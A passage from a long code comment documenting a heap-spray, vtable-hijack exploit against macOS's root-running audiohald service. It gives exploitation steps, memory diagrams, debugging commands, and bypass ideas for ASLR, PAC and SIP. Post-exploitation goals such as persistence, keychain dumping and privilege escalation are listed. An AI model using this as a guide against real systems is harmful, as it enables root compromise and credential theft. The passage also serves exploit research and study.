 *         +-> ENGINE OBJECT IN CONTROLLED MEMORY
 *
 * EXPLOITATION PHASE:
 *
 *   t=4: For i = 1 to num_attempts:
 *         |
 *         +-> Enumerate Engine objects (messages 1010002)
 *         |
 *         +-> Select random Engine object
 *         |
 *         +-> Send message 1010059 (FetchWorkgroupPort)
 *         |     object_id = selected_engine_id
 *         |
 *         +-> audiohald processes message:
 *         |     - Looks up object by ID
 *         |     - Calls obj->FetchWorkgroupPort()
 *         |     - Virtual call dereferences vtable
 *         |
 *         +-> IF SUCCESSFUL:
 *         |     - vtable points to controlled data
 *         |     - Function pointer = first gadget
 *         |     - ROP chain executes
 *         |     - Arbitrary code execution!
 *         |
 *         +-> IF UNSUCCESSFUL:
 *               - Crash (invalid pointer)
 *               - audiohald respawns via launchd
 *               - Try again with different object
 *
 * -----------------------------------------------------------------------------
 * F.2 SUCCESS CONDITIONS
 * -----------------------------------------------------------------------------
 *
 * For successful exploitation, these must align:
 *
 *   1. HEAP LAYOUT:
 *      - Spray allocations must be in same heap region as Engine objects
 *      - Freed slots must be correct size for Engine objects
 *
 *   2. ALLOCATION REUSE:
 *      - Engine object allocation must land in a freed slot
 *      - Slot must contain valid ROP payload
 *
 *   3. OBJECT CORRUPTION:
 *      - Specific memory layout allows controlled vtable
 *      - Or use-after-free leaves stale pointer
 *      - Or type confusion treats wrong object as Engine
 *
 *   4. ROP CHAIN:
 *      - Gadget addresses must be correct for ASLR slide
 *      - Stack/register setup must be achievable
 *      - PAC bypass if applicable
 *
 * PROBABILISTIC NATURE:
 *
 *   Heap exploitation is probabilistic. Multiple attempts often needed.
 *   --attempts parameter controls retry count.
 *   Each attempt may hit different Engine object with different heap state.
 *
 * -----------------------------------------------------------------------------
 * F.3 POST-EXPLOITATION
 * -----------------------------------------------------------------------------
 *
 * Once ROP chain executes in audiohald:
 *
 *   TYPICAL GOALS:
 *
 *   1. PERSISTENCE:
 *      - Write payload to disk
 *      - Modify launchd plist
 *      - Hook system libraries
 *
 *   2. PRIVILEGE ESCALATION:
 *      - audiohald runs as root!
 *      - Can access kernel interfaces
 *      - Can escalate to kernel
 *
 *   3. SANDBOX ESCAPE:
 *      - audiohald not sandboxed (or less restricted)
 *      - Can access filesystem
 *      - Can spawn processes
 *
 *   4. INFORMATION GATHERING:
 *      - Read files
 *      - Dump keychains
 *      - Access other processes
 *
 * COMMON ROP OBJECTIVES:
 *
 *   - Call mprotect() to make heap executable
 *   - Then jump to shellcode in heap
 *
 *   - Call dlopen() to load malicious dylib
 *
 *   - Call system() or posix_spawn() to run command
 *
 *   - Pivot stack to controlled memory for larger ROP chain
 *
 * =============================================================================
 * =============================================================================
 * SECTION G: MEMORY LAYOUT DIAGRAMS
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * G.1 AUDIOHALD HEAP BEFORE SPRAY
 * -----------------------------------------------------------------------------
 *
 *   ADDRESS SPACE:
 *
 *   0x00000001_00000000  +---------------------------+
 *                        | audiohald .text segment   |
 *                        | (code)                    |
 *                        +---------------------------+
 *                        | audiohald .data segment   |
 *                        | (globals)                 |
 *                        +---------------------------+
 *   0x00000001_xxxxxxxx  | Heap (grows up)           |
 *                        |  +---------------------+  |
 *                        |  | Existing objects    |  |
 *                        |  | from other clients  |  |
 *                        |  +---------------------+  |
 *                        |  | Free space          |  |
 *                        |  |                     |  |
 *                        +---------------------------+
 *   0x00007fff_xxxxxxxx  | Shared libraries          |
 *                        | (dyld cache)              |
 *                        +---------------------------+
 *                        | Stack (grows down)        |
 *   0x00007fff_ffffffff  +---------------------------+
 *
 * -----------------------------------------------------------------------------
 * G.2 AUDIOHALD HEAP AFTER SPRAY
 * -----------------------------------------------------------------------------
 *
 *   HEAP REGION (simplified):
 *
 *   +----------------+----------------+----------------+----------------+
 *   | MetaDevice 1   | CFString bufs  | MetaDevice 2   | CFString bufs  |
 *   | (object)       | (payload√ó50)   | (object)       | (payload√ó50)   |
 *   +----------------+----------------+----------------+----------------+
 *   | MetaDevice 3   | CFString bufs  | MetaDevice 4   | CFString bufs  |
 *   | (object)       | (payload√ó50)   | (object)       | (payload√ó50)   |
 *   +----------------+----------------+----------------+----------------+
 *   | ...continues for num_iterations...                                |
 *   +-------------------------------------------------------------------+
 *
 *   Each CFString buffer:
 *   +------------------+
 *   | ROP payload      |
 *   | (1152 bytes)     |
 *   | + malloc header  |
 *   +------------------+
 *   Total: ~1168 bytes
 *
 * -----------------------------------------------------------------------------
 * G.3 HEAP AFTER FREEING
 * -----------------------------------------------------------------------------
 *
 *   +----------------+----------------+----------------+----------------+
 *   | MetaDevice 1   | FREED SLOTS    | MetaDevice 3   | FREED SLOTS    |
 *   | (still alloc)  | (payload data  | (still alloc)  | (payload data  |
 *   |                |  still there!) |                |  still there!) |
 *   +----------------+----------------+----------------+----------------+
 *
 *   FREELIST:
 *   slot_A -> slot_B -> slot_C -> ... -> NULL
 *
 *   Each freed slot:
 *   +------------------+
 *   | next_free ptr    |  <- malloc uses for freelist
 *   +------------------+
 *   | (old payload     |  <- Still contains ROP data!
 *   |  data remains)   |
 *   +------------------+
 *
 * -----------------------------------------------------------------------------
 * G.4 HEAP AFTER ENGINE CREATION
 * -----------------------------------------------------------------------------
 *
 *   +----------------+----------------+----------------+----------------+
 *   | MetaDevice 1   | ENGINE OBJECT  | MetaDevice 3   | ENGINE OBJECT  |
 *   | (still alloc)  | (in old slot)  | (still alloc)  | (in old slot)  |
 *   +----------------+----------------+----------------+----------------+
 *
 *   Engine object in freed slot:
 *   +------------------+
 *   | vtable ptr       |  <- Written by EngineObject constructor
 *   +------------------+
 *   | object_id        |  <- Written
 *   +------------------+
 *   | type             |  <- Written
 *   +------------------+
 *   | ... fields ...   |  <- Partially written
 *   +------------------+
 *   | RESIDUAL PAYLOAD |  <- NOT overwritten! (beyond object size)
 *   | (ROP gadgets,    |
 *   |  fake vtable)    |
 *   +------------------+
 *
 * -----------------------------------------------------------------------------
 * G.5 EXPLOITATION SCENARIO - CORRUPTED VTABLE
 * -----------------------------------------------------------------------------
 *
 *   LEGITIMATE OBJECT:
 *
 *   EngineObject @ 0x100500000:
 *   +------------------+
 *   | vtable = 0x1000  |-----> Legitimate vtable @ 0x100001000:
 *   +------------------+       +------------------+
 *   | id = 42          |       | destructor       |
 *   +------------------+       +------------------+
 *   | type = 'engn'    |       | GetObjectID      |
 *   +------------------+       +------------------+
 *   | ...              |       | FetchWorkgroup   |-----> legit code
 *   +------------------+       +------------------+
 *
 *   CORRUPTED OBJECT (in controlled memory):
 *
 *   "EngineObject" @ 0x100600000:
 *   +------------------+
 *   | vtable = 0x60100 |-----> Fake vtable @ 0x100600100:
 *   +------------------+       +------------------+
 *   | (garbage)        |       | gadget1_addr     |
 *   +------------------+       +------------------+
 *   | (garbage)        |       | gadget2_addr     |
 *   +------------------+       +------------------+
 *   | (more payload)   |       | gadget3_addr     |-----> ROP chain!
 *   +------------------+       +------------------+
 *
 * =============================================================================
 * =============================================================================
 * SECTION H: DEBUGGING AND ANALYSIS TECHNIQUES
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * H.1 DEBUGGING AUDIOHALD
 * -----------------------------------------------------------------------------
 *
 * ATTACHING LLDB:
 *
 *   $ sudo lldb
 *   (lldb) process attach --name audiohald
 *
 * USEFUL BREAKPOINTS:
 *
 *   // Break on message receive:
 *   (lldb) b mach_msg
 *
 *   // Break on specific handler:
 *   (lldb) b _XIOContext_FetchWorkgroupPort
 *
 *   // Break on allocation:
 *   (lldb) b malloc
 *   (lldb) b calloc
 *
 *   // Break on free:
 *   (lldb) b free
 *
 * EXAMINING HEAP:
 *
 *   // Show malloc zones:
 *   (lldb) expr (void)malloc_zone_print(malloc_default_zone(), 1)
 *
 *   // Find allocations:
 *   (lldb) memory find --expression "0xDEADBEEF" --count 10
 *
 * -----------------------------------------------------------------------------
 * H.2 HEAP ANALYSIS
 * -----------------------------------------------------------------------------
 *
 * USING heap COMMAND:
 *
 *   $ sudo heap audiohald
 *
 *   Shows all heap allocations by class/size.
 *   Look for CFString allocations of ~1168 bytes.
 *
 * USING vmmap:
 *
 *   $ vmmap audiohald
 *
 *   Shows virtual memory regions.
 *   Look for MALLOC regions and their sizes.
 *
 * USING MallocStackLogging:
 *
 *   $ export MallocStackLogging=1
 *   $ /usr/libexec/audiohald
 *
 *   Records allocation call stacks.
 *   Use malloc_history to analyze.
 *
 * -----------------------------------------------------------------------------
 * H.3 MESSAGE TRACING
 * -----------------------------------------------------------------------------
 *
 * USING dtrace:
 *
 *   #!/usr/sbin/dtrace -s
 *
 *   syscall::mach_msg*:entry
 *   /execname == "audiohald"/
 *   {
 *       printf("mach_msg from %s\n", execname);
 *       ustack();
 *   }
 *
 * USING fs_usage:
 *
 *   $ sudo fs_usage -w audiohald
 *
 *   Shows file and Mach port activity.
 *
 * -----------------------------------------------------------------------------
 * H.4 CRASH ANALYSIS
 * -----------------------------------------------------------------------------
 *
 * CRASH LOGS:
 *
 *   ~/Library/Logs/DiagnosticReports/audiohald_*.crash
 *   /Library/Logs/DiagnosticReports/audiohald_*.crash
 *
 * CRASH LOG CONTENTS:
 *
 *   - Exception type (EXC_BAD_ACCESS, EXC_BAD_INSTRUCTION)
 *   - Faulting address
 *   - Register state at crash
 *   - Thread backtraces
 *   - Binary images (for ASLR slide)
 *
 * ANALYZING CRASH:
 *
 *   1. Find faulting instruction
 *   2. Check if address is in our controlled range
 *   3. Verify ROP chain layout vs crash
 *   4. Adjust payload and retry
 *
 * =============================================================================
 * =============================================================================
 * SECTION I: MITIGATIONS AND BYPASS TECHNIQUES
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * I.1 ASLR (ADDRESS SPACE LAYOUT RANDOMIZATION)
 * -----------------------------------------------------------------------------
 *
 * WHAT IT DOES:
 *   - Randomizes base addresses of code/data/heap/stack
 *   - Different addresses each process launch
 *   - Attacker can't hardcode addresses
 *
 * macOS ASLR:
 *   - dyld shared cache: Randomized per boot
 *   - Heap: Randomized per allocation
 *   - Stack: Randomized per thread
 *
 * BYPASS TECHNIQUES:
 *
 *   1. INFORMATION LEAK:
 *      - Find vulnerability that discloses addresses
 *      - Calculate ASLR slide from leaked address
 *      - Adjust ROP gadget addresses
 *
 *   2. HEAP SPRAY:
 *      - Spray large amount of data
 *      - Some addresses become predictable
 *      - Use relative addressing within spray
 *
 *   3. BRUTE FORCE (limited):
 *      - macOS has limited ASLR entropy
 *      - Some attacks succeed probabilistically
 *
 * -----------------------------------------------------------------------------
 * I.2 PAC (POINTER AUTHENTICATION CODES)
 * -----------------------------------------------------------------------------
 *
 * WHAT IT DOES (Apple Silicon only):
 *   - Cryptographic signature added to pointers
 *   - Signature verified before use
 *   - Invalid signature = crash
 *
 * PROTECTED POINTERS:
 *   - Return addresses (PACIBSP)
 *   - Function pointers
 *   - Vtable pointers (in some cases)
 *
 * BYPASS TECHNIQUES:
 *
 *   1. SIGNING GADGETS:
 *      - Find gadget that signs attacker-controlled value
 *      - Use legitimate signing to create valid pointer
 *
 *   2. PAC ORACLE:
 *      - Information leak reveals valid signatures
 *      - Reuse observed signatures
 *
 *   3. CONTEXT CONFUSION:
 *      - PAC uses context for signing
 *      - Different context = different signature
 *      - Find context where attacker controls inputs
 *
 *   4. JIT SPRAY:
 *      - JIT compilers create executable code
 *      - Spray JIT to create useful gadgets
 *      - JIT code may not be PAC-protected
 *
 * -----------------------------------------------------------------------------
 * I.3 STACK CANARIES
 * -----------------------------------------------------------------------------
 *
 * WHAT IT DOES:
 *   - Random value placed on stack before return address
 *   - Checked before function return
 *   - Buffer overflow would corrupt canary
 *
 * NOT RELEVANT HERE:
 *   - This exploit uses heap corruption, not stack
 *   - No stack buffer overflows involved
 *
 * -----------------------------------------------------------------------------
 * I.4 SANDBOXING
 * -----------------------------------------------------------------------------
 *
 * WHAT IT DOES:
 *   - Restricts process capabilities
 *   - Limits file access, network, IPC
 *   - Defined by sandbox profile
 *
 * audiohald SANDBOX:
 *   - Less restricted than typical apps
 *   - Needs access to audio hardware
 *   - Can perform many privileged operations
 *
 * POST-EXPLOITATION:
 *   - May need sandbox escape for full system access
 *   - Or operate within audiohald's capabilities
 *
 * -----------------------------------------------------------------------------
 * I.5 SIP (SYSTEM INTEGRITY PROTECTION)
 * -----------------------------------------------------------------------------
 *
 * WHAT IT DOES:
 *   - Protects system files and processes
 *   - Even root can't modify protected paths
 *   - Restricts kernel extension loading
 *
 * IMPACT:
 *   - Can't modify /System, /usr (except /usr/local)
 *   - Can't attach debugger to Apple processes
 *   - Can't load unsigned kexts
 *
 * BYPASS:
 *   - Requires kernel exploit to disable
 *   - Or boot to recovery mode
 *
 * =============================================================================
 * =============================================================================
 * SECTION J: REFERENCES AND FURTHER READING
 * =============================================================================
 * =============================================================================
 *
 * XNU KERNEL SOURCE:
 *   https://opensource.apple.com/source/xnu/
 *   Key files: osfmk/ipc/, osfmk/vm/, bsd/kern/
 *
 * LIBMALLOC SOURCE:
 *   https://opensource.apple.com/source/libmalloc/
 *   Key files: src/magazine_malloc.c, src/nano_malloc.c
 *
 * MACH IPC DOCUMENTATION:
 *   "Mach 3 Kernel Interfaces" (CMU)
 *   "Mac OS X Internals" by Amit Singh
 *
 * EXPLOITATION TECHNIQUES:
 *   "The Art of Exploitation" by Jon Erickson
 *   "A Guide to Kernel Exploitation" by Perla & Oldani
 *   Project Zero blog posts on iOS/macOS
 *
 * ROP TECHNIQUES:
 *   "Return-Oriented Programming" by Shacham et al.
 *   "Q: Exploit Hardening Made Easy" (ROP compiler)
 *   Ropper, ROPgadget tools
 *
 * PAC BYPASS RESEARCH:
 *   "Examining Pointer Authentication on the iPhone XS" (Google P0)
 *   "PACMAN: Attacking ARM Pointer Authentication" (MIT)
 *
 * COREAUDIO INTERNALS:
 *   Apple Developer Documentation: Audio HAL
 *   Reverse engineering audiohald with Hopper/IDA
 *
 * =============================================================================
 * END OF DEEP TECHNICAL DOCUMENTATION
 * =============================================================================
 */
